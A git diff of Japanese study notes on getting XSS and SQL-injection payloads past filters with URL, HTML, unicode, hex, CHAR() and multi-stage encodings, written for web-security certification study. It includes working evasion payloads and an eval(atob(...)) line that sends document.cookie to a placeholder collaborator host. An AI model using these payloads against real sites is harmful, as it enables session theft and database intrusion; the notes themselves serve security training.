@@ -1,6 +1,9 @@
 - 詳細：🔗[Obfuscating attacks using encodings](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings)
 - ペイロードのデコードで攻撃を防御するWebサイトに対して、難読化でXSSやSQLiを成功させるテクニック
 
+>[!NOTE]
+>OSCP試験においてはここまで求められない。BSCP、OSWE範囲。
+
 ---
 
 # 考え方
@@ -8,13 +11,13 @@
 ## 特定のcontextに合わせたデコードを把握する
 
 - ペイロードがどこに注入されるかを正確に考え、どのようなエンコード・デコードがされるかを推測すること
-	- 👀クエリパラメタならクライアントでエンコードされ、サーバでURLデコードされる
-	- 👀HTML要素はサーバでエンコードされ、クライアントでHTMLデコードされる
+	- クエリパラメタならクライアントでエンコードされ、サーバでURLデコードされる
+	- HTML要素はサーバでエンコードされ、クライアントでHTMLデコードされる
 
 ## デコードの不一致を利用する
 
-- ペイロードに対して、URLエンコードとHTMLエンコードなど、異なるエンコードを複数かけること [Web攻撃の難読化](#多段階encoding)
-- もしくは二重URLエンコード [Web攻撃の難読化](#URL%20encoding)
+- ペイロードに対して、URLエンコードとHTMLエンコードなど、異なるエンコードを複数かけること：[多段階encoding](#多段階encoding)
+- もしくは二重URLエンコード： [URL encoding](#URL%20encoding)
 - マイナーなエンコード
 
 ### なぜ成功するのか
@@ -31,13 +34,15 @@
 	- SELECTがブラックリスト入りしている場合、`SELECT` -> `%53%45%4C%45%43%54` (HackVertor: urlencode_all)
 
 - もしくは二重URLエンコード
-- 🚨ペイロードとターゲット環境次第だが、すべての文字列をURLエンコードするとペイロードがうまく動作しなくなることがある
+
+>[!Warning]
+>ペイロードとターゲット環境次第だが、すべての文字列をURLエンコードするとペイロードがうまく動作しなくなることがある。
 
 ---
 
 # HTML encoding
 
-- 💡クライアントサイドのペイロードに役立つ
+- クライアントサイドのペイロードに役立つ
 - HTML要素のテキストコンテンツ、属性(`href`,`onerror`等)にペイロードを注入する場合
 	- ブラウザにレンダリングするときデコードされる
 
@@ -56,7 +61,7 @@
 
 # XML encoding
 
-- 💡サーバサイドのペイロードに役立つ
+- サーバサイドのペイロードに役立つ
 - HTML encodingと同じ形式。違いはサーバ側でデコードされること。
 
 ---
@@ -77,14 +82,19 @@ eval("\\u0061lert(1)")
 ```html
 <a href="javascript\\u{0000000003a}alert(1)">Click me</a>
 ```
-⚠️：エクスプロイトサーバからDeliverするとデコードされて渡されるので、フィルタ回避できない
+
+>[!NOTE]
+>エクスプロイトサーバからDeliverするとデコードされて渡されるので、フィルタ回避できない。
 
 ---
 
 # hex escaping
 
-- JSの文字列としてペイロードを埋め込む場合(HackVertor: hex_escapes)
-- `eval("\x61lert")`
+- JSの文字列としてペイロードを埋め込む場合（HackVertor: hex_escapes）
+```js
+// alert
+eval("\x61lert")
+```
 
 - SQL文字列のペイロードを埋め込む場合(HackVertor: sql_hex)
 	- `SELECT` -> `0x53454c454354`
@@ -101,10 +111,12 @@ eval("\\u0061lert(1)")
 #  SQL: CHAR()関数
 
 - SQLペイロードの場合
+
 - ↓SELECT
 ```sql
 CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
 ```
+
 1. HackVertor: to_charcodeで変換
 2. `CHAR()+`の形式で、出力値を()に代入
 
@@ -134,7 +146,7 @@ eval('atob("ZmV0Y2goJ2h0dHBzOi8vQ09MTEFCT1JBVE9SX0RPTUFJTj9jPScrZG9jdW1lbnQuY29v
 #  多段階encoding
 
 - デコードの順序を理解する必要がある
-- `&bsol;u0061`[Web攻撃の難読化](#HTML%20encoding) -> `\u0061`[Web攻撃の難読化](#unicode%20escaping) → `a`
+- `&bsol;u0061`[HTML encoding](#HTML%20encoding) -> `\u0061`[unicode escaping](#unicode%20escaping) → `a`
 ```html
 <a href="javascript:&bsol;u0061lert(1)">Click me</a>
 ```
